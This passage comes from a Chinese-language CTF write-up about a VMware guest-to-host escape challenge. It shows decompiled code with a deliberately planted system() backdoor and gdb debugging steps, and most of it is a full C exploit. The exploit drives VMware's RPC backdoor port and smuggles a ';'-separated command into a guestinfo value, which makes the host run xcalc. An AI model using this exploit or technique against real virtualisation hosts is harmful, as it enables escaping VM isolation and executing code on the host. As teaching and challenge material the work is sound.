          if ( !(sub_5463D0(v40, 3) & 1) )
          {
            v7 = (__int64)v5;
            goto LABEL_81;
          }
          v25 = 0x20000LL;
          sub_546480(2LL, 0x20000LL);
          v41 = v5[0xC];
          v42 = (unsigned __int16 *)(*((_QWORD *)v5 + 7) + v5[11] - v41);
          if ( (_DWORD)v41 == 2 )
          {
            v25 = *v42;
            v26 = (const char *)3;
            sub_546480(3LL, v25);
            v43 = v5[0xC] - 2;
            v5[12] = v43;
          }
          else if ( (_DWORD)v41 == 3 )
          {
            v26 = (const char *)*((_QWORD *)v5 + 7);
            system(v26);                            // recv的时候的后门？
            v43 = v5[12] - 3;
            v5[12] = v43;
          }
#### 动态分析
首先要用Bundle在host中装上vmware(那个ovf文件我导入有点问题也不修了直接自己搭个新的)，之后拿patch文件替换掉原`vmware-vmx`文件。在host里我们使用`sudo gdb ./vmware-vmx_patched
-q`启动gdb，之后启动VMware和guest，使用`ps -aux | grep vmware-vmx`得到进程pid，在gdb中使用`attach
$pid`attach到该进程，为了方便先拿`echo 0 >
/proc/sys/kernel/randomize_va_space`关闭地址随机化，之后`b* 0x0000555555554000 +
0x16e60c`下个断点再`continue`让虚拟机进程继续。
为了得到漏洞触发路径，我们直接拿长亭师傅的exp过来，精简到只有一次`run_cmd`，发送单条指令后在gdb查看情况，发现这里到我们后门需要`[ebx+0x30]`为3,经过多次尝试发现这里是个循环处理，每次`[ebx+0x30]`会减去4字节发送给guest一直到最后有一个余数，而我们的目的就是让余数为3，再经过计算可以发现当我们输入的命令为4的整数倍的时候最终可以到达漏洞处。
还有一个问题是执行命令的参数前面固定为`1`，我在后面加了个`;`来执行下一条命令，因此最终去执行的命令就是`/usr/bin/xcalc &`
我们的方式是去执行两次命令，一次是`char *s1 = "info-set guestinfo.b ;/usr/bin/xcalc
&";`，设置这个`guestinfo.b`，一次是`char *s2 = "info-get
guestinfo.b";`去得到刚才设置的值，这个值就是我们调用system函数的参数，在gdb中下断点可以看到最终的调用参数
之后在host里弹出了计算器
### exp.c
exp用到长亭师傅的RPC函数实现。
    #include 
    #include 
    #include 
    void channel_open(int *cookie1,int *cookie2,int *channel_num,int *res){
        asm("movl %%eax,%%ebx\n\t"
            "movq %%rdi,%%r10\n\t"
            "movq %%rsi,%%r11\n\t"
            "movq %%rdx,%%r12\n\t"
            "movq %%rcx,%%r13\n\t"
            "movl $0x564d5868,%%eax\n\t"
            "movl $0xc9435052,%%ebx\n\t"
            "movl $0x1e,%%ecx\n\t"
            "movl $0x5658,%%edx\n\t"
            "out %%eax,%%dx\n\t"
            "movl %%edi,(%%r10)\n\t"
            "movl %%esi,(%%r11)\n\t"
            "movl %%edx,(%%r12)\n\t"
            "movl %%ecx,(%%r13)\n\t"
            :
            :
            :"%rax","%rbx","%rcx","%rdx","%rsi","%rdi","%r8","%r10","%r11","%r12","%r13"
           );
    }
    void channel_set_len(int cookie1,int cookie2,int channel_num,int len,int *res){
        asm("movl %%eax,%%ebx\n\t"
            "movq %%r8,%%r10\n\t"
            "movl %%ecx,%%ebx\n\t"
            "movl $0x564d5868,%%eax\n\t"
            "movl $0x0001001e,%%ecx\n\t"
            "movw $0x5658,%%dx\n\t"
            "out %%eax,%%dx\n\t"
            "movl %%ecx,(%%r10)\n\t"
            :
            :
            :"%rax","%rbx","%rcx","%rdx","%rsi","%rdi","%r10"
           );
    }
    void channel_send_data(int cookie1,int cookie2,int channel_num,int len,char *data,int *res){
        asm("pushq %%rbp\n\t"
            "movq %%r9,%%r10\n\t"
            "movq %%r8,%%rbp\n\t"
            "movq %%rcx,%%r11\n\t"
            "movq $0,%%r12\n\t"
            "1:\n\t"
            "movq %%r8,%%rbp\n\t"
            "add %%r12,%%rbp\n\t"
            "movl (%%rbp),%%ebx\n\t"
            "movl $0x564d5868,%%eax\n\t"
            "movl $0x0002001e,%%ecx\n\t"
            "movw $0x5658,%%dx\n\t"
            "out %%eax,%%dx\n\t"
            "addq $4,%%r12\n\t"
            "cmpq %%r12,%%r11\n\t"
            "ja 1b\n\t"
            "movl %%ecx,(%%r10)\n\t"
            "popq %%rbp\n\t"
            :
            :
            :"%rax","%rbx","%rcx","%rdx","%rsi","%rdi","%r10","%r11","%r12"
            );
    }
    void channel_recv_reply_len(int cookie1,int cookie2,int channel_num,int *len,int *res){
        asm("movl %%eax,%%ebx\n\t"
            "movq %%r8,%%r10\n\t"
            "movq %%rcx,%%r11\n\t"
            "movl $0x564d5868,%%eax\n\t"
            "movl $0x0003001e,%%ecx\n\t"
            "movw $0x5658,%%dx\n\t"
            "out %%eax,%%dx\n\t"
            "movl %%ecx,(%%r10)\n\t"
            "movl %%ebx,(%%r11)\n\t"
            :
            :
            :"%rax","%rbx","%rcx","%rdx","%rsi","%rdi","%r10","%r11"
           );
    }
    void channel_recv_data(int cookie1,int cookie2,int channel_num,int offset,char *data,int *res){
        asm("pushq %%rbp\n\t"
            "movq %%r9,%%r10\n\t"
            "movq %%r8,%%rbp\n\t"
            "movq %%rcx,%%r11\n\t"
            "movq $1,%%rbx\n\t"
            "movl $0x564d5868,%%eax\n\t"
            "movl $0x0004001e,%%ecx\n\t"
            "movw $0x5658,%%dx\n\t"
            "in %%dx,%%eax\n\t"
            "add %%r11,%%rbp\n\t"
            "movl %%ebx,(%%rbp)\n\t"
            "movl %%ecx,(%%r10)\n\t"
            "popq %%rbp\n\t"
            :
            :
            :"%rax","%rbx","%rcx","%rdx","%rsi","%rdi","%r10","%r11","%r12"
           );
    }
    void channel_recv_finish(int cookie1,int cookie2,int channel_num,int *res){
        asm("movl %%eax,%%ebx\n\t"
            "movq %%rcx,%%r10\n\t"
            "movq $0x1,%%rbx\n\t"
            "movl $0x564d5868,%%eax\n\t"
            "movl $0x0005001e,%%ecx\n\t"
            "movw $0x5658,%%dx\n\t"
            "out %%eax,%%dx\n\t"
            "movl %%ecx,(%%r10)\n\t"
            :
            :
            :"%rax","%rbx","%rcx","%rdx","%rsi","%rdi","%r10"
           );
    }
    void channel_recv_finish2(int cookie1,int cookie2,int channel_num,int *res){
        asm("movl %%eax,%%ebx\n\t"
            "movq %%rcx,%%r10\n\t"
            "movq $0x21,%%rbx\n\t"
            "movl $0x564d5868,%%eax\n\t"
            "movl $0x0005001e,%%ecx\n\t"
            "movw $0x5658,%%dx\n\t"
            "out %%eax,%%dx\n\t"
            "movl %%ecx,(%%r10)\n\t"
            :
            :
            :"%rax","%rbx","%rcx","%rdx","%rsi","%rdi","%r10"
           );
    }
    void channel_close(int cookie1,int cookie2,int channel_num,int *res){
        asm("movl %%eax,%%ebx\n\t"
            "movq %%rcx,%%r10\n\t"
            "movl $0x564d5868,%%eax\n\t"
            "movl $0x0006001e,%%ecx\n\t"
            "movw $0x5658,%%dx\n\t"
            "out %%eax,%%dx\n\t"
            "movl %%ecx,(%%r10)\n\t"
            :
            :
            :"%rax","%rbx","%rcx","%rdx","%rsi","%rdi","%r10"
           );
    }
    struct channel{
        int cookie1;
        int cookie2;
        int num;
    };
    uint64_t heap =0;
    uint64_t text =0;
    void run_cmd(char *cmd){
        struct channel tmp;
        int res,len,i;
        char *data;
        channel_open(&tmp.cookie1,&tmp.cookie2,&tmp.num,&res);
        if(!res){
            printf("fail to open channel!\n");
            return;
        }
        channel_set_len(tmp.cookie1,tmp.cookie2,tmp.num,strlen(cmd),&res);
        if(!res){
            printf("fail to set len\n");
            return;
        }
        channel_send_data(tmp.cookie1,tmp.cookie2,tmp.num,strlen(cmd)+0x10,cmd,&res);
        channel_recv_reply_len(tmp.cookie1,tmp.cookie2,tmp.num,&len,&res);
        if(!res){
            printf("fail to recv data len\n");
            return;
        }
        printf("recv len:%d\n",len);
        //the core part
        data = malloc(len+0x10);
        memset(data,0,len+0x10);
        for(i=0;i<len+0x10;i+=4){
            channel_recv_data(tmp.cookie1,tmp.cookie2,tmp.num,i,data,&res);
        }
        printf("recv data:%s\n",data);
        channel_recv_finish(tmp.cookie1,tmp.cookie2,tmp.num,&res);
        if(!res){
            printf("fail to recv finish\n");
        }
        channel_close(tmp.cookie1,tmp.cookie2,tmp.num,&res);
        if(!res){
            printf("fail to close channel\n");
            return;
        }
    }
    void exploit(){
        //the exploit step is almost the same as the leak ones
        struct channel chan[10];
        int res=0;
        int len,i;
        char *data;
        //char *s1 = "info-set guestinfo.b ;DISPLAY=:1  gnome-calculator";
        //char *s1 = "info-set guestinfo.b ;DISPLAY=:1 /usr/bin/gnome-calculator";
        char *s1 = "info-set guestinfo.b ;/usr/bin/xcalc &";
        char *s2 = "info-get guestinfo.b";
        run_cmd(s1);
        run_cmd(s2);
    }
    void main(){
        sleep(5);
        setvbuf(stdout,0,2,0);
        setvbuf(stderr,0,2,0);
        setvbuf(stdin,0,2,0);
        exploit();
    }
## 总结
总的来说这次数字经济共测大赛的题目还是很适合新手做的，并不需要太多的虚拟化知识，只要能把环境搭起来，知道一些基本的攻击面就能上手。本篇文章不涉及高深漏洞利用，只作为一篇入门文章给像我这样对逃逸感兴趣但很难有简单题上手的新手分享。